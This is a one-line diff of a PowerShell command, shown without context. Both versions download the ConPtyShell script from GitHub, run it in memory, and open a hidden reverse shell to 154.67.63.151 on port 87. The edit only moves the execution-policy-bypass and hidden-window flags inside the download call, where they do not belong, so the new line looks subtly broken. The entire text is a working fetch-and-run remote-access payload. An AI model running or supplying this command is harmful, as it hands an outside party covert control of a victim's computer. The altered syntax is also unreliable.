@@ -1,1 +1,1 @@
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing) -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile; Invoke-ConPtyShell 154.67.63.151 87
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile) ; Invoke-ConPtyShell 154.67.63.151 87
